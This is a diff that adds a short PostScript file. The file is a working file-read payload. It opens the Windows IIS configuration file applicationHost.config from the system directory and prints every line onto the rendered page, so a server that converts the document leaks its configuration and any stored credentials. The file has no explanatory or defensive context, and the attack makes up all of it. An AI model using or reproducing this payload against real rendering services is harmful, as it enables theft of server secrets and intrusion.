@@ -1,0 +1,28 @@
+%!PS
+/infile (C:\\Windows\\System32\\inetsrv\\Config\\applicationHost.config) (r) file def % open files
+/buff 1024 string def             % buffer for reading
+/Courier 0.5 selectfont            % name and size of font
+/LM 1 def                       % x coord
+/ypos 800 def                    % y coord
+/lineheight 0.5 def               % height of a line
+/newline {                       % function for changing lines
+    ypos lineheight sub
+    /ypos exch def
+    LM ypos moveto 
+} def
+LM ypos moveto                   % move to starting coords
+
+{ % read the file in loop
+        infile buff readline     % read the file 1 line at a time
+        { %ifelse
+                buff cvs show
+                newline
+        }
+        { %else
+                buff cvs show
+                infile closefile % close file pointer
+                exit             % exit the loop
+        } ifelse
+} bind loop
+
+showpage
